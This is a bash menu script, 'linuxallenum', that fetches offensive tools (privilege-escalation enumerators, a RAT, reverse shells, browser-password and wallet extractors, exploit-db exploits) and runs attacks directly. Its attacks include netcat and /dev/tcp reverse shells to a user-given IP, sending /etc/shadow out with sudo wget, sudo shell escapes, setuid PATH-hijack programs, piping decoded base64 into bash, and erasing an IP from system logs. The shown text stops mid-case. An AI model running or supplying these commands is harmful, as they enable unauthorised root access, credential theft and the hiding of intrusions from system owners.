#!/bin/bash

#Author: Fabio Defilippo
#email: 4starfds@gmail.com

WGET="2"
WGETP=$(which wget)
CURLP=$(which curl)

if [[ -f "$WGETP" ]];
then
	WGET="0"
elif [[ -f "$CURLP" ]];
then
	WGET="1"
fi

ENTSSL="https://github.com/"
ENTRAW="https://raw.githubusercontent.com/"
GSTRAW="https://gist.githubusercontent.com/"
EXDB="https://www.exploit-db.com/"

function Scarica
{
	echo "downloading $1"
	if [[ "$WGET" == "0" ]];
	then
		$WGETP --no-check-certificate "$2" -O "$3"
	elif [[ "$WGET" == "1" ]];
	then
		$CURLP -k -L -o "$3" "$2"
	fi
	if [[ -f ./$3 ]];
	then
		chmod +x ./$3
		echo "$3"" downloaded and runnable!"
	else
		echo "ERROR: download failed"
	fi
}

echo "linuxallenum, by FabioDefilippoSoftware"

while true; do
	echo "0. exit"
	echo "ACTIVE DIRECTORY"
	echo -ne " 20. skelsec/jackdaw\t\t\t\t\t139. DanMcInerney/icebreaker\n"
	echo "ANTIFORENSICS - STEGANOGRAPHY"
	echo -ne " 166. KuroLabs/stegcloak\n"
	echo "CRACK"
	echo -ne " 30. Greenwolf/spray\t\t\t\t\t31. NetSPI/PS_MultiCrack\t\t\t32. TiagoANeves/TDTLinuxPWD\n"
	echo -ne " 152. mthambipillai/password-cracker\t\t\t153. incredigeek/grond\n"
	echo "DNS"
	echo -ne " 33. m57/dnsteal\n"
	echo "DOCKER"
	echo -ne " 172. Keramas/Blowhole\t\t\t\t\t173. stealthcopter/deepce\t\t\t175. nccgroup/go-pillage-registries_1.0_Linux_i386\n"
	echo -ne " 176. nccgroup/go-pillage-registries_1.0_Linux_x86_64\n"
	echo "DUMPING - EXTRACTING - EXFILTRATING"
	echo -ne " 50. vocytopialatilityfoundation/volatility\t\t140. nyov/python-ffpassdecrypt\t\t\t141. pradeep1288/ffpasscracker/ffpassdecrypt\n"
	echo -ne " 149. louisabraham/ffpass\t\t\t\t150. aarsakian/MFTExtractor\t\t\t\t158. mikeborghi/pywallet\n"
	echo -ne " 162. TryCatchHCF/PacketWhisper\t\t\t180. hasanbulat/tshark/dumpcap (amd64)\t\t\t207. moonD4rk/HackBrowserData-32bit\n"
	echo -ne " 208. moonD4rk/HackBrowserData-64bit\n"
	echo "ENUMERATION"
	echo -ne " 1. rebootuser/LinEnum\t\t\t\t\t134. jtpereyda/enum4linux\t\t\t2. Arr0way/linux-local-enumeration-script\n"
	echo -ne " 3. sleventyeleven/linuxprivchecker\t\t\t4. jondonas/linux-exploit-suggester-2\t\t5. TheSecondSun/Bashark\n"
	echo -ne " 6. belane/linux-soft-exploit-suggester\t\t\t7. mzet-/linux-exploit-suggester\n"
	echo -ne " 8. carlospolop/privilege-escalation-awesome-scripts-suite/linPEAS\n"
	echo -ne " 9. InteliSecureLabs/Linux_Exploit_Suggester/Linux_Exploit_Suggester\n"
	echo -ne " 138. diego-treitos/linux-smart-enumeration/lse\t\t159. DominicBreuker/pspy64s\t\t160. DominicBreuker/pspy32s\n"
	echo -ne " 181. dylanaraps/neofetch\n"
	echo "EVASION"
	echo -ne " 22. cytopia/pwncat\n"
	echo "EXPLOIT"
	echo " 10. github - offensive-security/exploitdb - exploits/linux/local"
	echo " 11. github - offensive-security/exploitdb - exploits/linux_x86-64/local"
	echo " 12. github - offensive-security/exploitdb - exploits/linux_x86/local"
	echo " 13. https://github.com/offensive-security/exploitdb - exploits/unix/local"
	echo -ne " 167. exploit-db all exploits\n"
	echo "GATHERING"
	echo -ne " 157. HightechSec/git-scanner/gitscanner\n"
	echo "HASH"
	echo -ne " 131. mlgualtieri/NTLMRawUnHide\n"
	echo "JAVASCRIPT"
	echo -ne " 23. s0md3v/JShell/shell\n"
	echo "LDAP"
	echo -ne " 40. dinigalab/ldapsearch\n"
	echo "MISC"
	echo -ne " 41. SecureAuthCorp/impacket\n"
	echo "MITM - SNIFFING"
	echo -ne " 170. bettercap/bettercap\t\t\t\t179. hasanbulat/tshark (amd64)\n"
	echo "PRIVESC"
	echo -ne " 154. TH3xACE/SUDO_KILLER\n"
	echo "PROXY - REVPROXY"
	echo -ne " 211. fatedier/frp_386\t\t\t\t212. fatedier/frp_amd64\t\t\t\t213. fatedier/frp_arm\n"
	echo "RAT"
	echo -ne " 206. BenChaliah/Arbitrium-RAT\n"
	echo "REVSHELL"
	echo -ne " 155. shahril96/socat-reverse-shell\t\t\t156. Doctor-love/revshell\n"
	echo "SCANNING"
	echo -ne " 114. porterhau5/bash-port-scanner/scanner\t\t115. davidmerrick/Python-Port-Scanner/master/port_scanner\n"
	echo -ne " 151. vulmon/Vulmap/Vulmap-Linux\n"
	echo "SMB"
	echo -ne " 209. deepsecurity-pe/GoGhost\n"
	echo "TUNNELING"
	echo -ne " 21. T3rry7f/ICMPTunnel/IcmpTunnel_C\t\t\t133. blackarrowsec/mssqlproxy/mssqlclient\n"
	echo -ne " 137. sensepost/DNS-Shell\t\t\t\t163. jpillora/chisel_1.7.2_linux_amd64\t\t\t\t164. jpillora/chisel_1.7.2_linux_386\n"
	echo -ne " 165. pahaz/sshtunnel\n"
	echo "UPNP"
	echo -ne " 130. tenable/upnp_info\n"
	echo "UTILITIES"
	echo -ne " 99. Download your file\t\t\t\t\t100. nc Reverse Shell\t\t\t\t101. Reverse Shell with bash\n"
	echo -ne " 102. Decode base64 text to file\t\t\t103. Decode base64 text to bash\t\t\t104. PrivEsc with a binary ELF file using 'ps'\n"
	echo -ne " 105. PrivEsc with a binary ELF file using 'id'\t\t106. PrivEsc with a binary ELF file and 'cat'\t110. Convert hex to bin\n"
	echo -ne " 111. Show writable files\t\t\t\t120. unzip a file\t\t\t\t121. Ping sweep\n"
	echo -ne " 136. Capture All packets from loopback\n"
	echo -ne " 24. PrivEsc with wget to send a file\t\t\t25. PrivEsc with zip\t\t\t\t26. PrivEsc with perl\n"
	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
	echo -ne " 142. clear IP from logs\t\t\t\t143. socat port forward\t\t\t\t144. sudo -l\n"
	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
	echo -ne " 148. view history\t\t\t\t\t\t161. Privesc with chroot\t\t\t\t\n"
	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t178. analyze an executable file with strace and ltrace\n"
	echo -ne " 182. PrivEsc with sudoedit\t\t\t\t183. PrivEsc by revshell with root priv using systemctl\n"
	echo -ne " 184. PrivEsc with arp\t185. PrivEsc with cut\t186. PrivEsc with base64\n"
	echo -ne " 188. PrivEsc with ul\t189. PrivEsc with php5\t190. PrivEsc with file\n"
	echo -ne " 191. PrivEsc with tclsh8.5\t192. PrivEsc with env\t193. PrivEsc with diff\n"
	echo -ne " 194. PrivEsc with strace\t195. PrivEsc with awk\t196. PrivEsc with find\n"
	echo -ne " 197. PrivEsc with find and awk\t198. PrivEsc with less\t199. PrivEsc with more\n"
	echo -ne " 200. list all bins with perm 400 root\t201. PrivEsc with nano\t202. PrivEsc with apache2\n"
	echo -ne " 203. PrivEsc with LP_PRELOAD\t204. get capabilities\t205. PrivEsc with python\n"
	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\n"
	echo "WINRM"
	echo -ne " 132. Alamot/code-snippets/winrm/\n"
	echo "OTHERS"
	echo -ne " 112. corelan/mona\t\t\t\t\t113. utkusen/shotlooter\t\t\t\t135. trustedsec/tscopy\n"

	read -p "Choose a script: " SCELTA
	case "$SCELTA" in
	"0")
		exit 0
	;;
	"1")
		Scarica "rebootuser/LinEnum" "$ENTRAW""rebootuser/LinEnum/master/LinEnum.sh" "linenum.sh"
	;;
	"2")
		Scarica "Arr0way/linux-local-enumeration-script" "$ENTRAW""Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh" "linux-local-enum.sh"
	;;
	"3")
		Scarica "sleventyeleven/linuxprivchecker" "$ENTRAW""sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" "linuxprivchecker.py"
	;;
	"4")
		Scarica "jondonas/linux-exploit-suggester-2" "$ENTRAW""jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" "linux-exploit-suggester-2.pl"
	;;
	"5")
		Scarica "TheSecondSun/Bashark" "$ENTRAW""TheSecondSun/Bashark/master/bashark.sh" "bashark.sh"
	;;
	"6")
		Scarica "belane/linux-soft-exploit-suggester" "$ENTRAW""belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" "linux-soft-exploit-suggester.py"
	;;
	"7")
		Scarica "mzet-/linux-exploit-suggester" "$ENTRAW""mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
	;;
	"8")
		Scarica "carlospolop/privilege-escalation-awesome-scripts-suite/linPEAS" "$ENTRAW""carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" "linpeas.sh"
	;;
	"9")
		Scarica "InteliSecureLabs/Linux_Exploit_Suggester/Linux_Exploit_Suggester" "$ENTRAW""InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl" "Linux_Exploit_Suggester.pl"
	;;
	"10")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux/local/""$FILE" "$FILE"
		fi
	;;
	"11")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux_x86-64/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86-64/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86-64/local/""$FILE" "$FILE"
		fi
	;;
	"12")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux_x86/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86/local/""$FILE" "$FILE"
		fi
	;;
	"13")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="unix/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/unix/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/unix/local/""$FILE" "$FILE"
		fi
	;;
	"20")
		Scarica "skelsec/jackdaw/" "$ENTSSL""skelsec/jackdaw/archive/master.zip" "jackdaw.zip"
	;;
	"21")
		Scarica "T3rry7f/ICMPTunnel/IcmpTunnel_C" "$ENTRAW""T3rry7f/ICMPTunnel/master/IcmpTunnel_C.py" "IcmpTunnel_C.py"
	;;
	"22")
		Scarica "cytopia/pwncat" "$ENTRAW""cytopia/pwncat/master/bin/pwncat" "pwncat.py"
	;;
	"23")
		Scarica "s0md3v/JShell/shell" "$ENTRAW""s0md3v/JShell/master/shell.py" "shell.py"
	;;
	"24")
		echo "digit in your machine nc -lvnp 80 > file-received"
		read -p "digit the fullpath of wget listed in sudo -l (example /usr/bin/wget): " SUDOWGET
		read -p "digit your IP remote machine (example 10.10.4.13): " MYIP
		read -p "digit filename to send to your remote machine (example /etc/shadow): " NOMEFL
		if [[ "$SUDOWGET" != "" ]];
		then
			if [[ "$NOMEFL" != "" && "$MYIP" != "" ]];
			then
				sudo $SUDOWGET --post-file=$NOMEFL $MYIP
			fi
		fi
	;;
	"25")
		touch test.txt
		sudo zip 1.zip test.txt -T --unzip-command="sh -c /bin/bash"
	;;
	"26")
		sudo perl -e 'exec "/bin/bash";'
	;;
	"27")
		sudo git help config
	;;
	"28")
		echo "trying method 1"
		sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash
		echo "trying method 2"
		sudo apt-get changelog apt
		echo "trying method 3"
		TF=$(mktemp)
		echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
		sudo apt-get install -c $TF sl
		echo "trying method 4"
		read -p "Digit your IP: " MYIP
		read -p "Digit your port: " MYPORT
		if [[ "$MYIP" != "" && "$MYPORT" != "" ]];
		then
			echo "apt::Update::Pre-Invoke {\“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP $MYPORT >/tmp/f\”};" > pwn
		fi
	;;
	"29")
		read -p "Digit the filename to read: " FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			sudo cat $FILENAME
		fi
	;;
	"30")
		Scarica "Greenwolf/Spray/spray.sh" "$ENTRAW""Greenwolf/Spray/master/spray.sh" "spray.sh"
		Scarica "Greenwolf/Spray/passwords-English.txt" "$ENTRAW""Greenwolf/Spray/master/passwords-English.txt" "passwords-English.txt"
	;;
	"31")
		Scarica "NetSPI/PS_MultiCrack" "$ENTRAW""NetSPI/PS_MultiCrack/master/PS_MultiCrack.sh" "PS_MultiCrack.sh"
	;;
	"32")
		Scarica "TiagoANeves/TDTLinuxPWD" "$ENTRAW""TiagoANeves/TDTLinuxPWD/master/TDTLinuxPWD.py" "TDTLinuxPWD.py"
	;;
	"33")
		Scarica "m57/dnsteal" "$ENTRAW""m57/dnsteal/master/dnsteal.py" "dnsteal.py"
	;;
	"40")
		Scarica "dinigalab/ldapsearch" "$ENTRAW""dinigalab/ldapsearch/master/ldapsearch.py" "ldapsearch.py"
	;;
	"41")
		echo "Digit a folder name or folder/subfolder from https://github.com/SecureAuthCorp/impacket"
		read -p "(example impacket or impacket/ldap): " FOLD
		if [[ "$FOLD" != "" ]];
		then
			echo "Digit a file name from https://github.com/SecureAuthCorp/impacket/tree/master/""$FOLD"" with extension"
			read -p "(example exploit.py): " FILE
			if [[ "$FILE" != "" ]];
			then
				Scarica "SecureAuthCorp/impacket/$FOLD/$FILE" "SecureAuthCorp/impacket/master/$FOLD/$FILE" "$FILE"
			fi
		fi
	;;
	"50")
		Scarica "volatilityfoundation/volatility" "$ENTSSL""volatilityfoundation/volatility/archive/master.zip" "volatility.zip"
	;;
	"99")
		read -p "digit your IP remote machine (example http://10.10.4.13 OR http://192.168.10.10/public): " IP
		read -p "digit your exploit file from your remote machine to download in this local machine (example exploit.sh): " FILENAME
		if [[ "$FILENAME" != "" && "$IP" != "" ]];
		then
			Scarica "$IP/$FILENAME" "$IP/$FILENAME" "$FILENAME"
		fi
	;;
	"100")
		echo "Reverse Shell with netcat"
		read -p "digit your IP remote machine (example 10.10.4.13): " IP
		read -p "digit your Port remote machine (example 9001): " PORTA
		if [[ "$PORTA" != "" && "$IP" != "" ]];
		then
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORTA >/tmp/f
		fi
	;;
	"101")
		echo "Reverse Shell with bash"
		read -p "digit your IP remote machine (example 10.10.4.13): " IP
		read -p "digit your Port remote machine (example 9001): " PORTA
		if [[ "$PORTA" != "" && "$IP" != "" ]];
		then
			bash -i >& /dev/tcp/$IP/$PORTA 0>&1
		fi
	;;
	"102")
		read -p "Paste your base64 encoded text: " TEXTENC
		if [[ "$TEXTENC" != "" ]];
		then
			echo "$TEXTENC" | base64 -d > textdecode.txt
			echo "text decoded to textdecode.txt"
		else
			echo "Digit a valid base64 text"
		fi
	;;
	"103")
		read -p "Paste your base64 encoded text: " TEXTENC
		if [[ "$TEXTENC" != "" ]];
		then
			echo "$TEXTENC" | base64 -d | bash
			echo "text decoded to textdecode.txt"
		else
			echo "Digit a valid base64 text"
		fi
	;;
	"104")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
			echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"ps\");\n}" > root.c
			gcc root.c -o root
			chmod u+s root
			./root
			cd /tmp
			echo "/bin/bash" > ps
			chmod 777 ps
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root
			if [[ $(whoami) != "root" ]];
			then
				cd "$MIOPATH"
				cp /bin/sh /tmp/ps
				echo $PATH
				export PATH=/tmp:$PATH
				./root
				if [[ $(whoami) != "root" ]];
				then
					cd "$MIOPATH"
					ln -s /bin/sh ps
					export PATH=.:$PATH
					./root
					id
					whoami
				fi
			fi
		else
			echo "gcc does not exist"
		fi
	;;
	"105")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
                        echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"id\");\n}" > root2.c
                        gcc root2.c -o root2
			chmod u+s root2
			cd /tmp
			echo "/bin/bash" > id
			chmod 777 id
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root2
			whoami
		else
                        echo "gcc does not exist"
                fi
	;;
	"106")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
                        echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"cat /etc/passwd\");\n}" > root3.c
			gcc root3.c -o root3
			chmod u+s root3
			cd /tmp
			nano cat
			chmod 777 cat
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root3
			whoami
		else
                        echo "gcc does not exist"
                fi
	;;
	"110")
		read -p "Paste escaped hex values" HEXD
		if [[ "$HEXD" != "" ]];
		then
			echo -ne "$HEXD" > elf.bin
			chmod +x elf.bin
		fi
	;;
	"111")
		find / -writable -type  f 2>/dev/null | grep -v "/proc/"
	;;
	"112")
		Scarica "corelan/mona" "$ENTSSL""corelan/mona/archive/master.zip" "mona.zip"
	;;
	"113")
		Scarica "utkusen/shotlooter" "$ENTRAW""utkusen/shotlooter/master/shotlooter.py" "shotlooter.py"
	;;
	"114")
		Scarica "porterhau5/bash-port-scanner/scanner" "$ENTRAW""porterhau5/bash-port-scanner/master/scanner" "scanner.sh"
	;;
	"115")
		Scarica "davidmerrick/Python-Port-Scanner/port_scanner" "$ENTRAW""davidmerrick/Python-Port-Scanner/master/port_scanner.py" "port_scanner.py"
	;;
	"120")
		ls *.zip
		read -p "Digit a zip file: " FILENOME
		if [[ "$FILENOME" != "" ]];
		then
			if [[ -f "$FILENOME" ]];
			then
				unzip "$FILENOME"
			else
				echo "$FILENOME does not exist"
			fi
		fi
	;;
	"121")
		read -p "Digit first three IPv4 Values dotted (example, 192.168.1): " IPT
		if [[ "$IPT" != "" ]];
		then
			if [[ "$IPT" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]];
			then
				for (( RANGE=0 ; RANGE<256 ; RANGE++ ));
				do
					ping -c 1 "$IPT"".""$RANGE" | grep "from"
				done
			else
				echo "ERROR: invalid IPv4 three values dotted"
			fi
		fi
	;;
	"130")
		Scarica "tenable/upnp_info" "$ENTRAW""tenable/upnp_info/master/upnp_info.py" "upnp_info.py"
	;;
	"131")
		Scarica "mlgualtieri/NTLMRawUnHide" "$ENTRAW""mlgualtieri/NTLMRawUnHide/master/NTLMRawUnHide.py" "NTLMRawUnHide.py"
	;;
	"132")
		Scarica "Alamot/code-snippets/winrm" "$ENTRAW""Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb" "winrm_shell_with_upload.rb"
		Scarica "Alamot/code-snippets/winrm" "$ENTRAW""Alamot/code-snippets/master/winrm/winrm_shell.rb" "winrm_shell.rb"
	;;
	"133")
		Scarica "blackarrowsec/mssqlproxy/mssqlclient" "$ENTRAW""blackarrowsec/mssqlproxy/master/mssqlclient.py" "mssqlclient.py"
	;;
	"134")
		Scarica "jtpereyda/enum4linux" "$ENTRAW""jtpereyda/enum4linux/master/enum4linux.pl" "enum4linux.pl"
		Scarica "jtpereyda/enum4linux/share-list.txt" "$ENTRAW""jtpereyda/enum4linux/master/share-list.txt" "share-list.txt"
	;;
	"135")
		Scarica "trustedsec/tscopy" "$ENTSSL""trustedsec/tscopy/archive/master.zip" "tscopy.zip"
	;;
	"136")
		if [[ -f $(which tcpdump) ]];
		then
			tcpdump -vA -i lo -w tcpdump.pcap
		else
			echo "tcpdump is not installed"
		fi
	;;
	"137")
		Scarica "sensepost/DNS-Shell" "$ENTRAW""sensepost/DNS-Shell/master/DNS-shell.py" "DNS-shell.py"
	;;
	"138")
		Scarica "diego-treitos/linux-smart-enumeration/lse" "$ENTRAW""diego-treitos/linux-smart-enumeration/master/lse.sh" "lse.sh"
	;;
	"139")
		Scarica "DanMcInerney/icebreaker" "$ENTSSL""DanMcInerney/icebreaker/archive/master.zip" "icebreaker.zip"
	;;
	"140")
		Scarica "nyov/python-ffpassdecrypt" "$ENTRAW""nyov/python-ffpassdecrypt/master/ffpassdecrypt.py" "ffpassdecrypt.py"
		Scarica "nyov/python-ffpassdecrypt" "$ENTRAW""nyov/python-ffpassdecrypt/master/firefox_passwd.py" "firefox_passwd.py"
	;;
	"141")
		Scarica "pradeep1288/ffpasscracker" "$ENTRAW""pradeep1288/ffpasscracker/master/ffpassdecrypt.py" "ffpassdecrypt.py"
	;;
	"142")
		echo "Digit your remote IP or a specific substring to clear it from logs"
		read -p "(example, 192.168.1.1): " YOURIP
		if [[ "$YOURIP" != "" ]];
		then
			sed -e s/.*$YOURIP.*//g -i /var/log/*.log
		fi
	;;
	"143")
		if [[ -f $(which socat) ]];
		then
			echo "Digit a listen port"
			read -p "(example, 8000): " LPORT
			if [[ "$LPORT" != "" ]];
			then
				echo "Digit an IP to redirect its connection"
				read -p "(example, 192.168.0.3 or localhost): " IP
				if [[ "$IP" != "" ]];
				then
					echo "Digit the ""$IP""'s port"
					read -p "(example, 1337): " PORT
					if [[ "$PORT" != "" ]];
					then
						socat TCP-LISTEN:$LPORT,fork TCP:$IP:$PORT
					fi
				fi
			fi
		else
			echo "Digit a socat fullpath"
			read -p "(example, ./socat): " SOCAT
			if [[ "$SOCAT" != "" ]];
			then
				if [[ -f "$SOCAT" ]];
				then
					echo "Digit a listen port"
					read -p "(example, 8000): " LPORT
					if [[ "$LPORT" != "" ]];
					then
						echo "Digit an IP to redirect its connection"
						read -p "(example, 192.168.0.3 or localhost): " IP
						if [[ "$IP" != "" ]];
						then
							echo "Digit the ""$IP"" port"
							read -p "(example, 1337): " PORT
							if [[ "$PORT" != "" ]];
							then
								$SOCAT TCP-LISTEN:$LPORT,fork TCP:$IP:$PORT
							fi
						fi
					fi
				else
					echo "$SOCAT"" does not exist"
				fi
			fi
		fi

	;;
	"144")
		sudo -l
	;;
	"145")
		curl -X GET http://localhost:9200/esmapping/_search
		curl -X GET http://localhost:9200/_cat/indices?v
		while true; do
			echo "Digit an index to dump all docs"
			read -p "index name: " IND
			if [[ "$IND" != "" ]];
			then
				curl -X GET "http://localhost:9200/$IND/_search"
			fi
		done
	;;
	"146")
		lastlog
	;;
	"147")
		tail /var/log/auth.log
	;;
	"148")
		less ~/.bash_history
	;;
	"149")
		Scarica "louisabraham/ffpass" "$ENTSSL""louisabraham/ffpass/archive/master.zip" "ffpass.zip"
	;;
	"150")
		Scarica "aarsakian/MFTExtractor" "$ENTRAW""aarsakian/MFTExtractor/master/MFTExtractor.go" "MFTExtractor.go"
	;;
	"151")
		Scarica "vulmon/Vulmap/Vulmap-Linux" "$ENTRAW""vulmon/Vulmap/master/Vulmap-Linux/vulmap-linux.py" "vulmap-linux.py"
	;;
	"152")
		Scarica "mthambipillai/password-cracker" "$ENTRAW""mthambipillai/password-cracker/master/password_cracker.py" "password_cracker.py"
	;;
	"153")
		Scarica "incredigeek/grond" "https://www.incredigeek.com/home/downloads/grond.sh" "grond.sh"
	;;
	"154")
		Scarica "TH3xACE/SUDO_KILLER" "$ENTSSL""TH3xACE/SUDO_KILLER/archive/master.zip" "SUDO_KILLER.zip"
	;;
	"155")
		Scarica "shahril96/socat-reverse-shell" "$GSTRAW""shahril96/c2d9dd7a93901c4876c7be1572cccb26/raw/5e96b09fd88e8aed800bd07bbee55f913bc53e95/socat-reverse-shell.sh" "socat-reverse-shell.sh"
	;;
	"156")
		Scarica "Doctor-love/revshell" "$ENTRAW""Doctor-love/revshell/master/revshell" "revshell"
	;;
	"157")
		Scarica "HightechSec/git-scanner/gitscanner" "$ENTRAW""HightechSec/git-scanner/master/gitscanner.sh" "gitscanner.sh"
	;;
	"158")
		Scarica "mikeborghi/pywallet" "$ENTRAW""mikeborghi/pywallet/master/pywallet.py" "pywallet.py"
	;;
	"159")
		Scarica "DominicBreuker/pspy64s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy64s" "pspy64s"
	;;
	"160")
		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy32s" "pspy32s"
	;;
	"161")
		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\"chroot-dir\", 0755);\nchroot(\"chroot-dir\");\nfor(int i = 0; i < 1000; i++){\nchdir(\"..\");\n}\nchroot(\".\");\nsystem(\"/bin/bash\");\n}" > root4.c
		gcc root4.c -o root4
		chmod +x root4
		./root4
		whoami
	;;
	"162")
		Scarica "TryCatchHCF/PacketWhisper/cloakify" "$ENTRAW""TryCatchHCF/PacketWhisper/master/cloakify.py" "cloakify.py"
		Scarica "TryCatchHCF/PacketWhisper/decloakify" "$ENTRAW""TryCatchHCF/PacketWhisper/master/decloakify.py" "decloakify.py"
		Scarica "TryCatchHCF/PacketWhisper/packetWhisper" "$ENTRAW""TryCatchHCF/PacketWhisper/master/packetWhisper.py" "packetWhisper.py"
	;;
	"163")
		Scarica "jpillora/chisel_1.7.4_linux_amd64" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_amd64.gz" "chisel_1.7.4_linux_amd64.gz"
	;;
	"164")
		Scarica "jpillora/chisel_1.7.4_linux_386" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_386.gz" "chisel_1.7.4_linux_386.gz"
	;;
	"165")
		Scarica "pahaz/sshtunnel" "$ENTSSL""pahaz/sshtunnel/archive/master.zip" "sshtunnel.zip"
	;;
	"166")
		Scarica "KuroLabs/stegcloak" "$ENTSSL""KuroLabs/stegcloak/archive/master.zip" "stegcloak.zip"
	;;
	"167")
		echo "Digit an exploit file name without extension"
		read -p "(example, 460): " EXPL
		if [[ "$EXPL" != "" ]];
		then
			Scarica "$EXDB""$EXPL" "$EXDB""download/""$EXPL" "$EXPL"
		fi
	;;
	"168")
		echo "Digit a file extension without dot"
		read -p "(example, xml): " EXT
		if [[ "$EXT" != "" ]];
		then
			echo "Digit one or more keywords to search, separated by a bckslash and pipe"
			read -p "(example, password\|passwd): " PSKEY
			if [[ "$PSKEY" != "" ]];
			then
				echo "Digit a path to search"
				read -p "(example, /home/user): " FLDR
				if [[ -d "$FLDR" ]];
				then
					grep -ir -w "$PSKEY" --include "*.""$EXT" "$FLDR" 2>/dev/null
				fi
			fi
